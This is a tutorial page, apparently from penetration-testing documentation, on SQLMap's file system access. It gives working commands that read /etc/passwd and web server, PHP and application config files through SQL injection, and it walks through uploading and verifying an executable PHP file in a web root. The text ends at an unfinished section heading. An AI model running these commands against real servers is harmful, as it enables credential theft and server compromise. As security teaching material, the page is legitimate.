# File System Access with SQLMap

SQLMap provides powerful capabilities to interact with the target server's file system through SQL injection vulnerabilities. This section covers how to read, write, and execute files on the target system.


## Reading Files

<Tabs defaultValue="basic" className="pt-5 pb-1">
  <TabsList>
    <TabsTrigger value="basic">Basic Usage</TabsTrigger>
    <TabsTrigger value="advanced">Advanced Options</TabsTrigger>
    <TabsTrigger value="examples">Real-World Examples</TabsTrigger>
  </TabsList>
  <TabsContent value="basic">
    ### Basic File Reading

    To read files from the target system, use the `--file-read` parameter:

    ```bash
    sqlmap -u "http://target.com/vuln.php?id=1" --file-read="/etc/passwd"
    ```

    SQLMap will attempt to retrieve the specified file using the SQL injection vulnerability. The file will be stored in the output directory (default: `~/.sqlmap/output/`).
  </TabsContent>
  <TabsContent value="advanced">
    ### Advanced File Reading Options

    SQLMap offers several options to customize file reading:

    ```bash
    # Read multiple files
    sqlmap -u "http://target.com/vuln.php?id=1" --file-read="/etc/passwd" --file-read="/etc/hosts"

    # Specify output directory
    sqlmap -u "http://target.com/vuln.php?id=1" --file-read="/etc/passwd" -o

    # Use a specific technique
    sqlmap -u "http://target.com/vuln.php?id=1" --file-read="/etc/passwd" --technique=E
    ```

    The `-o` flag enables all optimization features, which can help with retrieving larger files more efficiently.
  </TabsContent>
  <TabsContent value="examples">
    ### Real-World Examples

    During penetration testing, you might want to retrieve configuration files that could contain sensitive information:

    ```bash
    # Web server configuration
    sqlmap -u "http://target.com/vuln.php?id=1" --file-read="/etc/apache2/apache2.conf"

    # PHP configuration
    sqlmap -u "http://target.com/vuln.php?id=1" --file-read="/etc/php/7.4/apache2/php.ini"

    # Web application configuration
    sqlmap -u "http://target.com/vuln.php?id=1" --file-read="/var/www/html/config.php"
    ```

    These files often contain database credentials, API keys, and other sensitive information.
  </TabsContent>
</Tabs>

## Writing Files

<Stepper>
  <StepperItem title="Prepare Your File">
    First, create the file you want to upload to the target system. For example, a simple PHP info script:
    
    ```php
    <?php phpinfo(); ?>
    ```
    
    Save this as `info.php` on your local machine.
  </StepperItem>
  <StepperItem title="Upload the File">
    Use the `--file-write` and `--file-dest` parameters to upload the file:
    
    ```bash
    sqlmap -u "http://target.com/vuln.php?id=1" --file-write="info.php" --file-dest="/var/www/html/info.php"
    ```
    
    SQLMap will attempt to write your local file to the specified destination on the target server.
  </StepperItem>
  <StepperItem title="Verify the Upload">
    After uploading, verify that the file was successfully written by accessing it through the web browser:
    
    ```
    http://target.com/info.php
    ```
    
    If the PHP info page displays, the file was successfully uploaded and is executable.
  </StepperItem>
</Stepper>

## Common File System Targets

When accessing a target's file system, certain files and directories are particularly valuable for penetration testers:
